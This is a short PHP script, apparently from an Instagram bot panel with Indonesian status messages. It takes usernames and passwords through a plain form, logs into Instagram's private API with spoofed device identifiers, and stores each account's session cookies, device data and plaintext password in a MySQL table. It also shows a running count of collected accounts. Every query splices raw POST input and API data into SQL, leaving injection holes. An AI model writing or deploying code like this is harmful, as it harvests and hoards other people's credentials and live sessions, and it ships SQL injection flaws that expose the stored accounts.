<?php
    include("config.php");
    include("api.php");
    if(isset($_POST['submit'])){
        
    $username = $_POST['username'];
    $password = $_POST['password']; 
    $useragent = generate_useragent();
    $devid = generateDeviceId();
    $guid = generateUUID();
    $post = instagram(1, $useragent, 'accounts/login/', 0, generateSignatureForPost('{"device_id":"'.$devid.'","guid":"'.$guid.'","username":"'.$username.'","password":"'.$password.'","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'));
    $resultHeader = $post[0];
    $resultJson = json_decode($post[1]);
    if($resultJson->status == "ok"){
        preg_match_all('%set-cookie: (.*?);%', $post[0], $d);
        for($o = 0;$o < count($d[0]);$o++) @$cookie.= $d[1][$o].";";
        $id = $resultJson->logged_in_user->pk;
        $userasli = $resultJson->logged_in_user->username;
        $cek = mysqli_query($konek, "select * from instagram where username = '$username'");
        $adagak = mysqli_num_rows($cek);
        if($adagak == 1){
            $insert = mysqli_query($konek, "UPDATE instagram SET cookies = '$cookie' WHERE username = '$username'");
            if($insert){
                echo "udh pernah login";
            } else {
                echo "error input 1";
            }
        } else {
            //$insert = mysqli_query($konek, "INSERT INTO instagram (username, idig, cookies, useragent, device_id, password) VALUES ('$userasli','$id','$cookie','$useragent','$devid','$password')");
            $insert = mysqli_query($konek, "INSERT INTO instagram VALUES ('$userasli','$id','0','$cookie','$useragent','0','$devid','1','1','$password','yes','yes','yes','yes','yes')");
            if($insert){
                echo "sukses login";
            } else {
                echo "error input 2";
            }
        }
    } else {
        print_r($resultJson);
        echo "<br><br>kena checkpoint / pw salah";
    }
    
    
    } else {
        $tot = mysqli_query($konek,"SELECT * FROM instagram");
        $total = mysqli_num_rows($tot);
        echo "total db = ".$total."<br><br>";
        ?>
        <form action="index.php" method="post">
            <input type="text" name="username" placeholder="username"><br>
            <input type="text" name="password" placeholder="password"><br>
            <input type="submit" name="submit"><br>
        </form>
        <?php
    }
?>